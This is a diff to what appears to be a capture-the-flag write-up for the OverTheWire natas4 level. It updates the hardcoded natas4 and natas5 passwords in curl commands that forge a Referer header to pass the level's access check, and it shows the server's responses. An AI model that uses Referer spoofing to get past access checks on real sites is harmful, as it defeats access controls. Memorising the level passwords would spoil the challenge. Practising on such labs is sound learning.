@@ -1,7 +1,7 @@
-### natas4 pswd: QryZXc2e0zahULdHrtHxzyYkj59kUxLQ
+### natas4 pswd: JDrPnuZAKyl6MkiqQGFIddrqpvgOASth
 
 ```bash
-curl -v -s -c cookie.txt -X POST http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org
+curl -v -s -c cookie.txt -X POST http://natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth@natas4.natas.labs.overthewire.org
 
 # <div id="content">
 
@@ -14,12 +14,12 @@ Firefox
 - first GET request \ edit
 - add one more header
 - Referer: http://natas5.natas.labs.overthewire.org/
-- check response - Access granted. The password for natas5 is **0n35PkggAPm2zbEpOU802c0x0Msn1ToK**
+- check response - Access granted. The password for natas5 is **e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M**
 - right click response \ copy \ copy as cURL
 
 ```bash
 
-curl 'http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org/' \
+curl 'http://natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth@natas4.natas.labs.overthewire.org/' \
   --compressed \
   -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0' \
   -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
@@ -42,12 +42,12 @@ curl 'http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewi
 # <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
 # <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
 # <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.# js"></script>
-# <script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
+# <script>var wechallinfo = { "level": "natas4", "pass": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth" };</script></head>
 # <body>
 # <h1>natas4</h1>
 # <div id="content">
 # 
-# Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+# Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
 # <br/>
 # <div id="viewsource"><a href="index.php">Refresh page</a></div>
 # </div>
@@ -62,7 +62,7 @@ or simply add -H referer to original curl command
 
 curl -v -s -c cookie.txt  \
   -H "Referer: http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org/  \
-  -X POST http://natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ@natas4.natas.labs.overthewire.org
+  -X POST http://natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth@natas4.natas.labs.overthewire.org
 
 # * Host natas4.natas.labs.overthewire.org:80 was resolved.
 # * IPv6: (none)
@@ -125,12 +125,12 @@ curl -v -s -c cookie.txt  \
 # <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
 # <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
 # <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
-# <script>var wechallinfo = { "level": "natas4", "pass": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ" };</script></head>
+# <script>var wechallinfo = { "level": "natas4", "pass": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth" };</script></head>
 # <body>
 # <h1>natas4</h1>
 # <div id="content">
 # 
- Access granted. The password for natas5 is 0n35PkggAPm2zbEpOU802c0x0Msn1ToK
+ Access granted. The password for natas5 is e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M
 # <br/>
 # <div id="viewsource"><a href="index.php">Refresh page</a></div>
 # </div>
